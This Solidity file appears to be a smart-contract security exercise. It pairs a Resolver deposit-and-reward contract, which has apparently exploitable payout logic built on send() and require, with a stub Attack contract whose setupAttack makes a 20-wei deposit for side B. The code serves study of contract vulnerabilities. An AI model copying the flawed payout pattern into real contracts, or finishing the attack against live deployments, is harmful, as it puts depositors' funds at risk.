pragma solidity 0.8.9;

// Two parties make a deposit for a particular side and the owner decides which side is correct.
// Owner's decision is based on some external factors irrelevant to this contract.
contract Resolver {
    enum Side {A, B}

    address public owner = msg.sender;
    address payable[2] public sides;

    uint256 public baseDeposit;
    uint256 public reward;
    Side public winner;
    bool public declared;

    uint256[2] public partyDeposits;

    /** @dev Constructor.
     *  @param _baseDeposit The deposit a party has to pay. Note that it is greater than the reward.
     */
    constructor(uint256 _baseDeposit) payable {
        reward = msg.value;
        baseDeposit = _baseDeposit;
    }

    /** @dev Make a deposit as one of the parties.
     *  @param _side A party to make a deposit as.
     */
    function deposit(Side _side) public payable {
        require(!declared, "The winner is already declared");
        require(sides[uint(_side)] == address(0), "Side already paid");
        require(msg.value > baseDeposit, "Should cover the base deposit");
        sides[uint(_side)] = payable(msg.sender);
        partyDeposits[uint(_side)] = msg.value;
    }

    /** @dev Declare the winner as an owner.
     *  Note that in case no one funded for the winner when the owner makes its transaction, having someone else deposit to get the reward is fine and doesn't affect the mecanism.
     *  @param _winner The party that is eligible to a reward according to owner.
     */
    function declareWinner(Side _winner) public {
        require(msg.sender == owner, "Only owner allowed");
        require(!declared, "Winner already declared");
        declared = true;
        winner = _winner;
    }

    /** @dev Pay the reward to the winner. Reimburse the surplus deposit for both parties if there was one.
     */
    function payReward() public {
        require(declared, "The winner is not declared");
        uint depositA = partyDeposits[0];
        uint depositB = partyDeposits[1];

        partyDeposits[0] = 0;
        partyDeposits[1] = 0;

        // Pay the winner. Note that if no one put a deposit for the winning side, the reward will be burnt.
        require(sides[uint(winner)].send(reward), "Unsuccessful send");

        // Reimburse the surplus deposit if there was one.
        if (depositA > baseDeposit && sides[0]!=address(0)) {
            require(sides[0].send(depositA - baseDeposit), "Unsuccessful send");    
        }

        if (depositB > baseDeposit && sides[1]!=address(0)) {
            require(sides[1].send(depositB - baseDeposit), "Unsuccessful send");    
        }

        reward = 0;
    }
    
}

contract Attack {
    Resolver public resolver;
    uint public x;
    
    constructor(Resolver _resolverAddress) {
        resolver = Resolver(_resolverAddress);
    }
    
    function setupAttack() public payable{
         resolver.deposit{value:20}(Resolver.Side.B);
    }
}

